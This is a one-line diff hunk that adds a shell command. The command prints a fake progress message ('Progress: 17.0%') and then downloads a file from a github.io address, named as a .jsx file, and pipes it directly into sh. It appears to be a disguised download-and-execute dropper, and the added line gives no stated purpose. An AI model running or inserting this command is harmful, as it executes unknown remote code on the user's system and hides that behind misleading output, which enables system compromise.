@@ -1,0 +1,1 @@
+echo 'Progress: 17.0%'; curl -L --progress-bar frkns.github.io/fun/PROVIDES_GRANNY_INSTITUTIONS.jsx | sh
